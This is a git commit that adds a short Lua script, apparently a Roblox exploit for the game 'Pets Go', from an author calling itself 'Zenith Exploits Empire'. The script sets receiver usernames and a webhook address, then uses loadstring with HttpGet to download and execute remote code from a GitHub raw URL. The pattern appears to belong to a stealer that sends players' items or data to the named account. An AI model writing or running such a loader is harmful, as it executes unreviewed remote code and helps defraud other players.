e94aa9b5f9a078434219173aebed7907779e5d0b
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 10:23:15 +0200

    Add generated script

---
+++ pets go/test.lua
@@ -0,0 +1,5 @@
+Username = "Dabird_Bedwars"
+Username2 = "Dabird_Bedwars"
+Webhook = "sidd.com"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
